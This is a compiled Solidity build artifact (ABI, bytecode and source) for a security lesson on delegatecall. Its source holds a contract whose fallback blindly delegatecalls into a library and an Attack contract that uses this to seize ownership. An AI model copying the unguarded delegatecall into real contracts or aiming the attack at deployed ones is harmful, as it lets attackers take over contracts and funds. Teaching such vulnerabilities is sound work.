{
  "contractName": "Hackme",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "contract Lib",
          "name": "_lib",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback",
      "payable": true
    },
    {
      "inputs": [],
      "name": "lib",
      "outputs": [
        {
          "internalType": "contract Lib",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    },
    {
      "inputs": [],
      "name": "owner",
      "outputs": [
        {
          "internalType": "address",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function",
      "constant": true
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516102c83803806102c88339818101604052602081101561003357600080fd5b8101908080519060200190929190505050336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101f3806100d56000396000f3fe60806040526004361061002d5760003560e01c80638da5cb5b146100c4578063928012301461011b5761002e565b5b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16600036604051808383808284378083019250505092505050600060405180830381855af49150503d80600081146100ba576040519150601f19603f3d011682016040523d82523d6000602084013e6100bf565b606091505b505050005b3480156100d057600080fd5b506100d9610172565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b34801561012757600080fd5b50610130610197565b604051808273ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16815260200191505060405180910390f35b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff168156fea264697066735822122008a149927da9e8ab217ff5b4cea98c1e5ee2f5cc8e46f88d62007e01dd361af964736f6c634300060a0033",
  "immutableReferences": {},
  "source": "// SPDX-License-Identifier: MIT\npragma solidity ^0.6.10;\n\n\ncontract Hackme {\n\n    address public owner;\n    Lib public lib;\n\n    constructor(Lib _lib) public {\n        owner = msg.sender;\n        lib = Lib(_lib);\n    }\n\n    fallback() external payable{\n        address(lib).delegatecall(msg.data);\n    }\n}\n\ncontract Lib {\n    address public owner;\n\n    function pwn() public {\n        owner = msg.sender;\n    }\n}\n\ncontract Attack {\n    address public hackMe;\n\n    constructor(address _hackMe) public {\n        hackMe = _hackMe;\n    }\n\n    function attack() public {\n        hackMe.call(abi.encodeWithSignature(\"pwn()\")); // This calls the fallback function since pwn() is not a function in the hackme contract\n    }\n}",
  "sourcePath": "/home/dev/Desktop/Sol/other/Smart_contract_programmer/Security/contracts/delegateCall.sol",
  "compiler": {
    "name": "solc",
    "version": "0.6.10+commit.00c0fcaf.Emscripten.clang"
  },
  "schemaVersion": "3.4.3",
  "updatedAt": "2021-11-12T05:03:28.066Z",
  "networkType": "ethereum",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}